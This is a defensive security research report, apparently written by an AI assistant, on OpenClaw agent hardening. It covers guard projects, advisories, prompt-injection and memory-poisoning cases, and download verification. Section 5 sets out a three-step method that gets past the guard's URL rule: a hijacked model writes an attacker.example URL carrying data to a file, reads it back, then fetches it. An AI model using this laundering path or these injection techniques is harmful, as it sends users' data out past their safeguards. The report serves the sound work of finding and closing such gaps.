# How other OpenClaw users handle security, and what Jorah should take from it

Research date: 2026-11-19. Research only: nothing was installed, cloned, changed or posted. Jorah's live config was not read; "what Jorah uses" comes from the repo (`config/pc/*.patch.json5`, `plugins/jorah-guard`, `deploy/`), so it is source tier.

## How to read this

Tags on claims:

- **[verified: URL, date]** I read it in a primary source on that date. "GitHub API" means `api.github.com` (repo, search, releases or advisories endpoints), read 2026-11-19. Star counts and push dates are as the API returned them that day.
- **[docs-only: path]** OpenClaw's bundled docs for 2026.10.9 (8b18b55) on the PC, under `/opt/node/lib/node_modules/openclaw/docs/`. Not tested.
- **[secondary: URL]** A news or vendor write-up; I did not reach the primary source.
- **[inference]** My reasoning from the facts around it.
- **[unverified]** From memory or one weak source.
- **[simulated]** I drove `jorah-guard`'s hooks directly with the repo's matrix in a scratch folder (script: `/private/tmp/claude-501/-Users-adam-Documents-jorah/21865ad8-5eb9-4fbd-8703-8204f06109e4/scratchpad/sim-launder.mjs`). No Gateway, no network. This is unit tier, not live behaviour.

"Trustworthy?" judgments rest on a README and repo metadata. I audited no code.

---

## 0. The short answer

1. **There is no real "OpenClaw antivirus".** Dozens of GitHub repos use that word. The ones with that exact pitch are demos (for example `Gk0Wk/ClawGuard`, which bills itself as the antivirus for OpenClaw: 87 stars, last push 2026-03-20, and its own README says the installable part is a demo and not a product release) [verified: GitHub API and README, 2026-11-19]. The serious projects are skill scanners (OpenClaw's own ClawScan, Cisco, NVIDIA, Snyk), tool-call policy plugins (Rampart, Knostic Shield), egress firewalls (Pipelock, OpenShell) and an advisory feed (ClawSec). Their own numbers say detection is weak: Cisco's scanner catches 7.7% of malicious skills at HIGH with rules alone [verified: cisco-ai-defense/skill-scanner README, 2026-11-19], and OpenClaw's own paper found any two of ClawHub's scanners overlap on at most 10.4% of positives [verified: https://arxiv.org/abs/2606.01494, 2026-11-19].
2. **Jorah's URL rule is the same design Anthropic uses** in its hosted web-fetch tool: only URLs already in the conversation may be fetched [verified: https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool, 2026-11-19]. OpenClaw itself has nothing like it: its threat model rates exfiltration through `web_fetch` as high residual risk, and a domain allowlist is still an open feature request [docs-only: security/THREAT-MODEL-ATLAS/collection-and-exfiltration.md] [verified: https://github.com/openclaw/openclaw/issues/39685, 2026-11-19].
3. **The rule has a hole.** In the simulation, a hijacked model writes the attacker's URL into an ordinary workspace file, reads the file back, and the guard then lets `web_fetch` open it, because the guard counts URLs from every tool result as "seen" [simulated]. Anthropic's design has the same weakness and a setting (`url_sources`) to close it.
4. **One published advisory affects 2026.10.9**, published today: GHSA-pw3x-g8v8-fvj2, high, CVSS 8.8, fixed in 2026.10.33 (extended-stable) and 2026.11.4 [verified: GitHub API, 2026-11-19]. The guard blocks the tool involved because it is not in the matrix [simulated]; that has not been checked on the live Gateway.
5. **What works elsewhere is structure, not detection:** a reader with no private data, typed tools instead of free URLs, approval for anything outward, OS-level limits. Jorah already has more of this than any public hardening guide I found.

---

## 1. OpenClaw's built-in defences in 2026.10.x, and which Jorah uses

| Defence | What it does | Jorah (from the repo) |
|---|---|---|
| Tool policy: global and per-agent `tools.allow` / `tools.deny`, profiles | Removes tools from an agent. A global deny cannot be granted back [docs-only: gateway/security/tool-permissions.md] | **Used.** Global deny of `nodes`, `computer`, `gateway`; per-agent denies; main has no shell (`config/pc/stage0.patch.json5`, `learning-guard.patch.json5`) |
| Sandboxing (Docker, Podman, OpenShell, SSH backends), `workspaceAccess`, `tools.fs.workspaceOnly`, `tools.elevated` | Runs tools in a container. Opt-in [docs-only: gateway/security/tool-permissions.md, gateway/security/prompt-injection.md] | **Used.** Podman, `exec.host: "sandbox"` (fails closed), elevated off, `workspaceOnly: true`. Main's own chat is outside the sandbox with no shell |
| `tools.web.fetch.ssrfPolicy` and `browser.ssrfPolicy` | Blocks private and internal addresses with DNS pinning, re-checks redirects. `blockedHostnames` is a denylist; `allowedHostnames` only makes exceptions for private hosts. **No public-site allowlist** [docs-only: tools/web-fetch.md, gateway/security/browser-control.md] | **Partly.** Fetch default kept. Browser has `dangerouslyAllowPrivateNetwork: true` because strict mode refused every host on the PC; the guard's `forbidden()` and nftables cover private ranges instead |
| Exec approvals | Ask before host commands. OpenClaw calls them guardrails; many past bypasses (section 4) | **Not relied on.** The sandbox is the limit |
| Untrusted-content wrapping | Fetched pages, mail and hooks are wrapped in `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` markers with a notice; chat-template tokens are stripped [docs-only: gateway/security/prompt-injection.md] | **On by default.** It is a label for the model, not a control |
| Plugin hooks: `before_tool_call` (block, rewrite, `requireApproval`), `after_tool_call`, `message_sending` | Where a guard plugin lives. Plugins run in-process and are trusted code [docs-only: plugins/hooks/tool-policy.md, plugins/plugin-permission-requests.md] | **Used.** This is `jorah-guard` |
| "Capability consent" for plugins | I found no per-plugin consent or permission model in the 2026.10.9 docs. The controls are `plugins.allow`, `hooks.allowConversationAccess`, and install policy [docs-only: grep of plugins/, tools/plugin.md] | `plugins.allow` **used** |
| `security.installPolicy` | Runs your own local command on every skill or plugin install; it returns allow, warn or block. Off by default. OpenClaw otherwise does **no** local dangerous-code blocking at install [docs-only: tools/skills-config.md, gateway/security/tool-permissions.md] | **Not used** (no match in `config/`) |
| `openclaw security audit` (`--deep` adds code scans of plugins and skills and live Gateway checks) | Config and permission audit with 112 check ids listed [docs-only: gateway/security/audit-checks.md, cli/security.md] | **Used** by hand (a patch cites the audit of 2026-11-08) |
| `openclaw policy` (bundled plugin) | Drift check of config against a `policy.jsonc`, through `doctor --lint`. Does not enforce at request time [docs-only: cli/policy.md] | **Not used** |
| ClawHub scanning: VirusTotal, ClawScan, static analysis, 14-day GitHub account age; `openclaw skills verify` | A pending or stale scan can still install with a warning [docs-only: start/why-openclaw.md, security/THREAT-MODEL-ATLAS.md, tools/skills.md] | **Not applicable.** Jorah installs no ClawHub skills |
| Egress: `proxy.proxyUrl` (managed forward proxy for the Gateway's own HTTP) | Sends runtime traffic through a proxy **you** run; OpenClaw ships none. Raw sockets and child processes can bypass it [docs-only: security/network-proxy.md] | **Not used** for the Gateway. Jorah has its own proxy for the site browsers and nftables per Linux user |
| `secrets.egressProxy` with `allowedHosts` | Gateway-hosted exec gets placeholder secrets that a loopback proxy swaps in only for bound hosts; optional host allowlist. Not for sandbox exec or harness subprocesses [docs-only: gateway/secrets/secret-store-and-egress.md] | **Not used**, and little use: Jorah has no Gateway-hosted exec |
| Memory provenance | Each memory chunk has an origin class; a turn that read network content is tainted and Dreaming will not promote it. Tools that don't declare network results don't taint [docs-only: concepts/memory-architecture.md] | **On by default.** The guard's cards add to it |
| Formal models (TLA+) for auth, session isolation and tool gating | [docs-only: security/formal-verification.md] | Nothing to use |

Two facts frame all of this:

- OpenClaw does not treat prompt-injection exfiltration as its bug. Reports of a prompt-injection chain that crosses no policy, auth or sandbox boundary are closed as no-action [docs-only: gateway/security/trust-model.md].
- Its own threat model lists data theft via `web_fetch` (T-EXFIL-001) with high residual risk because, in its words, "arbitrary external URLs remain permitted", and recommends URL allowlisting [docs-only: security/THREAT-MODEL-ATLAS/collection-and-exfiltration.md]. The feature request for `allowedDomains`/`denyDomains` (issue #39685, opened 2026-03-08, labelled P1 and impact:security) is still open, with two unmerged PRs (#96333, #92190) and no maintainer decision [verified: https://github.com/openclaw/openclaw/issues/39685, 2026-11-19].

So every OpenClaw user who wants what Jorah's URL rule does has to build it, as Jorah did.

---

## 2. Open-source security projects for OpenClaw

A GitHub search for openclaw plus security returned 1,194 repos, and the searches for guard, scanner, hardening, injection, shield, firewall and egress returned 399, 435, 294, 195, 73, 58 and 19 (with overlap) [verified: GitHub API search, 2026-11-19]. Sorted by stars, each list falls below 10 stars within its first 30 results, and many repos were last pushed within weeks of being created [inference from those lists]. The table has the ones with real maintainers or adoption, plus a few that match Adam's question.

| Project | What it actually does | Maintainer, licence | Last push; stars | Hooks in as | Trust and supply-chain view |
|---|---|---|---|---|---|
| **openclaw/clawscan** | Runs several skill scanners (NVIDIA SkillSpector, Cisco, Tencent AIG and others) in Docker, then a judge. Has `clawscan openclaw-install-policy` for `security.installPolicy`. It is what ClawHub runs | OpenClaw org, MIT | 2026-11-17; 156 | CLI, npm `@openclaw/clawscan` | First-party. Needs Docker and, for some scanners, an LLM key. Only matters if you install third-party skills or plugins |
| **openclaw/openclaw-ansible** | Hardened install: UFW, fail2ban, Tailscale, Docker | OpenClaw org, MIT | 2026-11-17; 607 | Ansible | First-party. Jorah's nftables and separate users already go further |
| **prompt-security/clawsec** | Signed advisory feed (NVD and GitHub, polled daily), guarded skill installs, drift detection for SOUL.md and similar files | Prompt Security, AGPL-3.0-or-later | 2026-11-19; 1,136 | Skills plus a persistent hook and optional cron | Known vendor, feed is Ed25519-signed. But it is skills and a hook inside the agent, installed with `npx`, discovering more packages from a remote catalog. Use the feed as reading; don't install |
| **slowmist/openclaw-security-practice-guide** | A guide written for the agent to read and apply to itself: red lines, skill audit steps, nightly audit | SlowMist, MIT | 2026-04-06; 2,840 | A document you hand to the agent | Good checklist. As a control it is prompt text, which is not a control. Stale 7 months |
| **adversa-ai/secureclaw** | Plugin with 56 audit checks and auto-fixes, plus a skill of 15 behaviour rules | Adversa AI, MIT (README) | 2026-04-12; 351 | Plugin and skill | Audit overlaps `openclaw security audit`. The rules are prompt text. Stale 7 months against a fast-moving host |
| **knostic/openclaw-shield** | Secret and PII redaction of tool output, blocks destructive commands, a gate tool the model is told to call | Knostic, Apache-2.0 | 2026-05-12; 93 | Plugin | Calls itself alpha and says it stops being effective within days unless it keeps being updated. Stale 6 months. Regex DLP: catches key-shaped secrets, not private prose |
| **peg/rampart** | Policy engine: deny, ask or allow per tool call, hash-chained audit log. Says plainly that it is not a sandbox | One small org, Apache-2.0 | 2026-11-17; 92 | `before_tool_call` plugin for OpenClaw; hooks for Claude Code, Codex and others | Honest README, active. Same hook as `jorah-guard` with generic rules; no taint or URL provenance. Would duplicate, not add |
| **pipelab-org/pipelock** | Forward proxy between agent and network: host allowlist, DLP and entropy checks on URLs and bodies, MCP scanning, signed receipts | Joshua Waldrep, Apache-2.0 core, paid tier under Elastic License | 2026-11-19; 1,007 | Proxy or sidecar | Most candid of the set: its README admits that in the default mode data with no recognisable format, or encoded or split data, can get through; strict mode is allowlist-only with no web browsing. Body inspection needs TLS interception and a new CA |
| **NVIDIA/NemoClaw** with **NVIDIA/OpenShell** | Runs OpenClaw inside a kernel-enforced sandbox with per-host network policy, operator approval for new hosts, and credentials injected only for approved endpoints | NVIDIA (OpenShell moving to CNCF), Apache-2.0 | 2026-11-19; 23,052 and 21,798 | Replaces how you run OpenClaw | Strongest backing. But Lasso showed a sandboxed NemoClaw agent still leaking a config key through allowed egress and rewriting its own SOUL.md; NVIDIA's reply was that the sandbox did what it was configured to do [secondary: https://bdtechtalks.substack.com/p/how-prompt-injection-broke-nvidias]. Its README labels WSL 2 support experimental |
| **cisco-ai-defense/defenseclaw** | Go gateway plus Python CLI: scan before use, inspect runtime traffic, export audit evidence | Cisco, Apache-2.0 | 2026-11-19; 913 | Gateway, connector hooks | Enterprise governance. Heavy for one user |
| **cisco-ai-defense/skill-scanner** | Static, dataflow and optional LLM scan of skills | Cisco, Apache-2.0 | 2026-11-16; 2,747 | CLI | States its own limits and measured rates (7.7% rules-only; 66.7% reach review with an LLM judge at 15.4% false positives) |
| **snyk/agent-scan** (was Invariant's mcp-scan) | Finds agents, MCP servers and skills on the machine and scans them | Snyk, Apache-2.0 | 2026-11-19; 3,260 | CLI (`uvx`) | Its README warns that scanning **starts** stdio MCP servers and contacts remote ones, and that it needs a Snyk token with a daily limit. Run only in a throwaway box |
| **backbay-labs/clawdstrike** | Policy engine and EDR with signed audit chain, kernel sensors, fleet control plane | Backbay Labs, Apache-2.0 | 2026-11-16; 304 | Daemon, SDKs | Pre-1.0 beta. Fleet tool |
| **tophant-ai/ClawVault** | A vault around files and credentials with monitoring and natural-language policies | Tophant, MIT | 2026-08-20; 1,071 | API gateway, file monitor | Rules generated by a model from chat. Not looked at further |
| **gl0di/clawseccheck** | Read-only audit skill with an A-F grade; says it makes no network calls | One person, MIT | 2026-11-19; 59 | ClawHub skill | Careful README, but a single-maintainer skill inside the agent. `openclaw security audit --deep` is the first-party equivalent |
| **openguardrails/openguardrails** (MoltGuard, `openafw/moltguard`) | Prompt-injection detection and secret sanitising; claims to be the most downloaded security skill on ClawHub | OpenGuardrails, Apache-2.0 | 2026-11-18; 372 | Plugin | It offers 500 free detections a day, which implies content goes to their service [inference from README]. Classifier-only |
| **capsulesecurity/clawguard** | A second model judges each tool call | Capsule, MIT | 2026-02-04; 23 | Plugin | PostHog usage metrics on by default. Stale 9 months. Judge sees attacker text too |
| **SeyZ/clawbands** | Ask-before-write middleware with audit log | One person, MIT | 2026-02-09; 194 | Plugin | Stale 9 months. Approval on chat channels is a yes or no that the agent itself relays, which a hijacked model could forge [inference] |
| **Gk0Wk/ClawGuard** | Bills itself as the antivirus for OpenClaw | One person, no licence detected | 2026-03-20; 87 | Plugin demo | Self-described docs-first demo |
| **AquaOne/ClawGuard** | Python AST scan and audit-hook interception | Unknown, MIT (README) | 2026-05-12; 240 | Python tool | Claims not checked |
| **madarco/controlclaw** | Firewall container: rules written in English and judged by a model, password swap, approvals | One person or small firm, AGPL-3.0 | 2026-11-12; 5 | Proxy container, managed service | Created 2026-10-30. Too new |
| **jgamblin/OpenClawCVEs** | Automated tracker of OpenClaw advisories and CVEs, updated every 6 hours | Jerry Gamblin, MIT | 2026-11-19; 170 | A page to read | Useful second feed. Reports 543 CVE records naming OpenClaw, 500 assigned by VulnCheck (its count; I did not recount) |
| **backslash-security/Claw-Hunter**, **knostic/openclaw-detect** | Scripts for companies to find OpenClaw on staff machines | Vendors, MIT / Apache-2.0 | 2026-02-17; 89 / 2026-05-12; 95 | MDM scripts | Not for Jorah |

Alternatives people move to instead of hardening: `nanocoai/nanoclaw` (each agent in its own container; 31,124 stars) and `nearai/ironclaw` (12,718 stars) [verified: GitHub API, 2026-11-19]. Not evaluated.

**Why "security skills" are the wrong shape.** A skill or plugin that defends the agent runs with the agent's privileges, updates from someone else's repo, and is exactly what ClawHavoc abused. A September 2026 paper showed that an update to a benign plugin's hook configuration alone compromised all seven harnesses it tested, with success up to 92.5%, and Microsoft Defender caught none of the artifacts [verified: https://arxiv.org/abs/2609.03884, 2026-11-19; the abstract does not name the harnesses]. Every third-party guard is a new way in.

---

## 3. General agent-security tools people pair with OpenClaw

| Tool or pattern | State | Verdict for Jorah |
|---|---|---|
| **LlamaFirewall / Prompt Guard 2** (Meta, `meta-llama/PurpleLlama`) | Active, 4,486 stars, pushed 2026-11-13 [verified: GitHub API]. Three parts: jailbreak classifier, an "alignment check" that audits the agent's reasoning (still experimental), CodeShield [verified: https://arxiv.org/abs/2505.03574, 2026-11-19] | Classifier-only detection is theatre against a motivated attacker: 12 published defences were bypassed, most above 90% [verified earlier: https://arxiv.org/abs/2510.09023, in `docs/plan/research/security.md`]. Usable as a signal, never as a gate |
| **LLM Guard** (Protect AI) | **Archived**, last push 2026-07-08 [verified: GitHub API] | Don't adopt |
| **NeMo Guardrails** (now `NVIDIA-NeMo/Guardrails`) | Active, 7,531 stars [verified: GitHub API] | Built for chatbots you write yourself. No fit with a claude-cli runtime |
| **Lakera Guard** | Hosted classifier API, not open source [unverified, from memory] | Would send Jorah's content to a third party |
| **Invariant guardrails** | Last push 2026-01-12; Invariant's scanner is now `snyk/agent-scan` [verified: GitHub API] | Scanner only if MCP servers from strangers are ever added |
| **CaMeL** (Google DeepMind) | Research code, last push 2025-06-20 [verified: GitHub API]. 77% of tasks solved with a security guarantee against 84% undefended [verified earlier: https://arxiv.org/abs/2503.18813] | Right idea, no product. Take its two usable parts: typed values in place of prose, and taint that follows data. Jorah does the second |
| **Design-patterns paper** (dual LLM, plan-then-execute, action-selector and others) | [verified: https://arxiv.org/abs/2506.08837, 2026-11-19, title and authors; the pattern names are from memory] | The pattern catalogue Jorah's plan already follows |
| **Quarantined reader agent** | OpenClaw's own docs recommend a read-only or tool-less reader that summarises untrusted content, and warn that the summary is still untrusted [docs-only: gateway/security/prompt-injection.md] | **The structural fix.** `reader-web` in Jorah's plan is this. A reader that holds no private data can open any URL, because it has nothing to leak |
| **Anthropic `sandbox-runtime`** | Active, 7,188 stars, Apache-2.0 [verified: GitHub API]. Default-deny network through host proxies with an allowed-domain list, bubblewrap on Linux [verified: README at raw.githubusercontent.com/anthropics/sandbox-runtime, 2026-11-19] | Already in use: it is the Claude Code sandbox the project runner relies on |
| **Model choice** | OpenClaw's docs cite attack success of 0.5% for Claude Opus 4.5 against 8.5% for Gemini 2.5 Pro, and above 80% for adaptive attackers [docs-only: gateway/security/prompt-injection.md; original study not traced] | Jorah runs a top-tier Claude. Cheap first layer, not a wall |

**What works in practice:** taking a leg off the trifecta in code (reader without private data, actor without untrusted text), approval for outward or lasting actions, OS limits under the agent. **What is theatre:** rules in the prompt, a judge model reading the same hostile text, regex DLP as the only exfiltration control, a grade from a scanner.

Evidence that memory is the soft spot: one crafted email planted lasting false memory in OpenClaw in 87.5% of 56 held-out cases, and still worked against input, model and system level defences [verified: https://arxiv.org/abs/2607.05189 abstract, 2026-11-19]. Poisoning any one of capability, identity or knowledge files raised attack success from 24.6% to 64-74% across four models; file protection blocked 97% of injections but also blocked legitimate updates [verified: https://arxiv.org/abs/2604.04759 abstract, 2026-11-19]. Jorah's answer, a card showing the exact text, is the same trade made usable.

---

## 4. Other threats in the OpenClaw ecosystem

### Advisories

Repo-level advisories for `openclaw/openclaw`: **723**, of which 14 critical, 250 high, 390 medium, 69 low; 39 carry a CVE id [verified: GitHub API, all 8 pages, 2026-11-19]. That is one more than Jorah's research of 2026-11-02 counted. I tested every advisory's version range against 2026.10.9.

| Advisory | Severity | What | Affected | Fixed in | 2026.10.9 affected? |
|---|---|---|---|---|---|
| **GHSA-pw3x-g8v8-fvj2** (no CVE yet), published 2026-11-19 | High, CVSS 8.8 | Title: OpenClaw delegation could skip approval for restricted agents. The `openclaw` tool could apply lasting config changes without approval when tool policy denied execution and file writes, so a restricted agent could turn on host command execution through config | `>= 2026.9.2, < 2026.10.33` and `>= 2026.11.1, < 2026.11.4` | 2026.10.33 (extended-stable), 2026.11.4 (stable) | **Yes** |
| CVE-2026-44112, -44113, -44115, -44118 ("Claw Chain", Cyera, 2026-05-15) | Critical 9.6 down to High 7.7 | OpenShell sandbox write and read races, env exposure between validation and exec, client-supplied owner flag on MCP loopback | Before the 2026-04-23 fixes | 2026.4.22 [secondary] or "April 23 fixes" [verified: https://www.cyera.com/blog/claw-chain-cyera-research-unveil-four-chainable-vulnerabilities-in-openclaw, 2026-11-19] | No |
| CVE-2026-25253 | High 8.8 | One-click RCE: a link made the browser hand over the Gateway token | `< 2026.1.29` | 2026.1.29 | No |
| "ClawJacked" (Oasis, Feb 2026) | High | A web page brute-forced the loopback Gateway password over WebSocket; loopback was exempt from rate limits | Early 2026 | 2026.2.25 or 2026.2.26; sources disagree [secondary: https://thehackernews.com/2026/02/clawjacked-flaw-lets-malicious-sites.html] | No |
| GHSA-gv46-4xfq-jv58 (CVE-2026-28466) | Critical 9.9 | Node exec approval bypass | `< 2026.2.14` | 2026.2.14 | No |
| GHSA-g5cg-8x5w-7jpm, GHSA-9p3r-hh9g-5cmg | Critical | Heartbeat inherited owner status; sandbox escape race in the file bridge | `<= 2026.3.28` | 2026.3.31 | No |
| Imperva message-object injection (2026-06-10) | n/a | Instructions hidden in WhatsApp contact names, vCard names and location labels reached the model as trusted text | Before 2026.4.23 | 2026.4.23 moved those fields to an untrusted-metadata channel [verified: https://www.imperva.com/blog/compromise-openclaw-with-prompt-injections-in-message-objects/, 2026-11-19] | No. Telegram was not tested there |
| The 75 advisories of 2026-09-11 (exec allowlist parsing, owner checks, DNS pinning, cron reach) | Up to High | See Jorah's earlier research | Mostly `< 2026.7.1` or `< 2026.8.1`; highest `< 2026.9.3` | Up to 2026.9.3 | No |
| Six old advisories with exact-version or pre-rename ranges (`clawdbot`, `moltbot`, 2026.1.29, 2026.3.8) | Low to High | Various | Old | Old | No [inference from the ranges] |

Notes on the new one:

- **It is not yet in GitHub's global advisory database.** A query for advisories affecting `openclaw@2026.10.9` returned none, and the newest OpenClaw entry there is dated 2026-10-21 [verified: `api.github.com/advisories?ecosystem=npm&affects=openclaw@2026.10.9`, 2026-11-19]. So `npm audit` and Dependabot say nothing yet. Only the repo's own advisory list shows it.
- **What it means for Jorah.** By the docs, a run with Full Access applies delegated config changes with no approval, by design, and that includes Full Access that is only the configured default [docs-only: gateway/permission-modes.md, cli/openclaw.md]. Jorah sets `tools.exec.mode: "full"` with the sandbox as the limit, so main's runs probably count as Full Access [inference]. If so, with or without the bug, what keeps a hijacked main agent from asking the `openclaw` tool to change config is `jorah-guard`: the tool is in no matrix class, and the guard blocks it [simulated]. Not checked: whether main is offered that tool on the claude-cli runtime, and whether `before_tool_call` fires for it on the live Gateway.
- 2026.10.33's notes list the fix under tool authority: delegated changes now need effective approval [verified: GitHub releases API, 2026-11-19].
- 2026.10.9 is no longer current: `latest` is 2026.11.5 (2026-11-17), `extended-stable` is 2026.10.33 (2026-11-18) [verified: registry.npmjs.org/openclaw dist-tags, 2026-11-19]. Releases since 2026.10.9 also carry fixes with a security flavour and no advisory (sandboxed image previews, restrictive allowlists preserved, automation runs re-checking access to owner-private memory) [verified: release notes for 2026.10.33, 2026.11.3, 2026.11.5]. Advisories come in batches, months apart, so more for this range are likely [inference].

### Other threats

| Threat | Evidence | Jorah's exposure |
|---|---|---|
| **Malicious ClawHub skills** | ClawHavoc: 341 of 2,857 skills malicious in Koi's count; later counts of 824 and 1,184 [secondary: https://blog.polyswarm.io/the-clawhavoc-campaign, https://www.antiy.net/p/clawhavoc-analysis-of-large-scale-poisoning-campaign-targeting-the-openclaw-skill-market-for-ai-agents/]. Five skills passed VirusTotal and ClawScan [verified earlier: https://unit42.paloaltonetworks.com/openclaw-ai-supply-chain-risk/]. Snyk "ToxicSkills": 36.8% of 3,984 skills flawed, 76 with malicious payloads [secondary only]. ClawHub now holds 67,453 skill versions [verified: https://arxiv.org/abs/2606.01494] | Low: no ClawHub skills. `security.installPolicy` is off, so nothing in code enforces that |
| **Fake packages and installers** | `@openclaw-ai/openclawai` on npm (uploaded 2026-03-03) installed an infostealer and RAT through a postinstall hook [secondary: https://research.jfrog.com/post/ghostclaw-unmasked/] | Low: pinned version, 7-day rule, exact package name. Keep `ignore-scripts` |
| **Exposed gateways** | About 65,000 on Shodan and 180,000 on ZoomEye per Cyera [verified that Cyera says so, 2026-11-19]. Other counts range from 30,000 to 245,000 [secondary] | Low: loopback, tailnet, token |
| **Token and state theft by ordinary malware** | Infostealers taking whole OpenClaw state folders [secondary, from earlier research] | The PC is Adam's daily machine; WSL separation and root-owned secret files help. Windows-side malware is outside Jorah's controls |
| **Memory and identity-file poisoning** | MemGhost and the CIK study above; Zenity and Lasso made agents rewrite SOUL.md, in Zenity's case with a scheduled task re-injecting it [secondary: https://www.esecurityplanet.com/threats/openclaw-or-open-door-prompt-injection-creates-ai-backdoors/] | Medium. Cards for memory, rules, skills and schedules after taint. Not seen by the guard: Dreaming and Claude Code jobs (p5-plan 4.7) |
| **Plugin supply chain** | Plugins run in-process as trusted code [docs-only]; the hook-update paper above | Low while `plugins.allow` holds and all plugins are Jorah's own or bundled |
| **Browser control** | The docs say request interception is not a network firewall: redirects, popups, service workers and late page code can bypass it [docs-only: gateway/security/browser-control.md] | Medium. The URL rule checks the first URL only. Evaluate is off and typing asks; nftables blocks private ranges |
| **Channel spoofing** | Dozens of allowlist bypasses through mutable names (Discord, Matrix, Teams, Slack), all fixed before 2026.9 [verified: advisories list] | Low: Telegram allowlist by numeric id, one user |
| **Log poisoning** | Crafted WebSocket headers written to logs that a model later reads [secondary: https://www.pointguardai.com/ai-security-incidents/openclaw-log-poisoning-enables-indirect-prompt-injection-risk] | Low: loopback only. Treat logs as outside text if Jorah ever reads them |

---

## 5. The URL problem

### How others let an agent open links after it has read untrusted text

| Approach | Who | Strength | Cost |
|---|---|---|---|
| **Only URLs already in the conversation** | Anthropic's hosted `web_fetch`: URLs from user messages, client tool results and earlier search or fetch results; never URLs that exist only in the model's own output. Also: URLs over 250 characters refused, credential-looking URLs refused, and a `url_sources` setting to stop tool results that echo model-written text from counting. Anthropic still says some risk remains [verified: https://platform.claude.com/docs/en/agents-and-tools/tool-use/web-fetch-tool, 2026-11-19] | Blocks constructed URLs | The agent cannot open a page it "knows" exists. That is today's incident |
| **Is this exact URL already public?** | OpenAI: before an automatic fetch, check the exact URL against an index built by a crawler that never sees conversations; if absent, show the user a warning with the link. They rejected domain allowlists because trusted sites redirect [secondary: search excerpts of https://openai.com/index/ai-agent-link-safety/ (the page returned 403 to me), https://www.gend.co/blog/openai-ai-agent-link-safety] | Lets the agent open known public pages nobody typed | Needs a web index. A self-hoster's nearest equivalent is "it came back from a search" |
| **Domain allowlist** | Anthropic `allowed_domains`; Claude Code sandbox; OpenShell; Pipelock strict mode; Jorah's site proxy | Simple, enforceable below the agent | Useless for general browsing. Leaks through allowed hosts where an attacker can post or own a path |
| **Egress proxy with DLP** | Pipelock, ControlClaw | Catches key-shaped secrets, logs destinations | By Pipelock's own table, encoded or split data passes. Body checks need TLS interception |
| **Human approval per new link** | OpenAI's warning dialog; browser agents | One tap, no paste | Fatigue. A person cannot see a secret encoded in a path |
| **Reader with nothing to leak** | OpenClaw docs; the dual-LLM pattern; Jorah's planned `reader-web` | The reader opens anything; the main agent never does | What crosses back must be typed and short, and it stays untrusted |
| **Typed tools instead of URLs** | CaMeL-style designs; GitHub and package-registry tools | The model supplies `owner`, `repo`, `tag`; code builds the URL. Only a few constrained characters can leak, and to a host the attacker cannot watch [inference] | One tool per need |
| **URL-shape rules** | Anthropic's length cap and credential check | Cheap | Heuristic |

### The hole in Jorah's rule

`jorah-guard` adds URLs to the "seen" set from **every** tool result (`after_tool_call` in `plugins/jorah-guard/index.js`) and lets a tainted main agent write ordinary workspace files without a card (`fileWrite` in `lib/policy.js`). In the simulation, after one web search:

1. `write notes/tmp.md` containing `https://attacker.example/c?d=…`: allowed.
2. `read notes/tmp.md`: allowed, and the URL becomes "seen".
3. `web_fetch` of that URL: **allowed** [simulated].

Any tool whose result echoes its input would do the same; the script shows it for a search or memory result carrying the query back. Whether the real tools echo is unknown. A model has to be hijacked first, and a top-tier Claude rarely is, but this rule exists for that case. The fix is Anthropic's: count URLs only from results that come from outside (search, fetch, browser, GitHub, site and mail readers) and from Adam's typed messages.

### Why today's block happened, and the fixes that keep the rule

Jorah built the release URL himself from a repo name and tag. Nobody had shown it to him, and it was outside `github.com/AdamHikl`, so the rule did what it should. Options, least risk first:

- **Don't open the page at all.** The toolbox installer already reads the release's date and GitHub's digest from the API as its own user (ADR 0004). Let the proposal step, or a small read tool taking `owner`, `repo`, `tag`, return those fields. No URL passes through the model.
- **A card instead of a block** for an unseen URL that is HTTPS, has no query string or credentials, is short, and whose host is shown plainly. One tap replaces the paste.
- **Shape-based allowlist entries** such as `github.com/<owner>/<repo>/releases/tag/<tag>` with a strict character set and no query. The leak is a few characters, to GitHub. Whether a repo owner can see requests for paths that do not exist is [unverified].
- **`reader-web`**, when built, makes the question go away for reading.

### How others verify downloads

| Method | Proves | Does not prove |
|---|---|---|
| Publisher's checksum file | The file matches what the same server says | Anything, if the server or release is compromised |
| **GitHub's own asset digest**: SHA-256 computed by GitHub at upload, in the UI, REST (`digest` on each asset), GraphQL and `gh` [verified: https://github.blog/changelog/2025-06-03-releases-now-expose-digests-for-release-assets/, https://docs.github.com/en/rest/releases/releases, 2026-11-19] | The bytes equal what was uploaded | That the upload was honest, or that the asset was not replaced before you read the digest |
| **Immutable releases** (GA 2025-10-28): assets and tag cannot change after publishing; the release object has an `immutable` flag; `gh release verify <tag>` and `gh release verify-asset <tag> <file>` [verified: https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/, https://docs.github.com/en/code-security/how-tos/secure-your-supply-chain/secure-your-dependencies/verifying-the-integrity-of-a-release, 2026-11-19] | No swap after publication | Honest build; only for repos that turned it on |
| **Build attestations**: `gh attestation verify <file> --repo owner/repo` (Sigstore) | The file was built by that repo's Actions workflow | That the source is benign. Use `gh` 2.102.0 or newer: before it, `--signer-workflow` matched by prefix [verified: https://github.com/cli/cli/security/advisories/GHSA-wjmr-j3rp-mh2g, published 2026-09-30] |
| SLSA provenance, cosign signatures | Same family, per project | Same limits |
| Release age (Jorah's 7 days) | Time for a bad release to be noticed | A slow-burn compromise |

Jorah's toolbox (GitHub's digest read from the API, a 7-day age, no drafts or pre-releases, nothing run at install, a no-root user with HTTPS-only egress) is ahead of every OpenClaw hardening guide I read, none of which verifies downloads at all [inference from the READMEs read]. What it lacks is the `immutable` flag and attestation check where a publisher offers them.

---

## 6. Recommendations for Jorah, ranked

| # | What | Effort | Risk it removes | Risk it adds |
|---|---|---|---|---|
| 1 | **Close the URL laundering path.** Count "seen" URLs only from outside-sourced tool results and Adam's typed messages; never from `read`, `write`, `edit`, memory, session or search-wrapper results. Add the write-read-fetch case to the hijacked-model tests | Small: the guard and its tests | A three-call bypass of the one rule that guards exfiltration | More refusals for URLs sitting in workspace files. Pair with 3 |
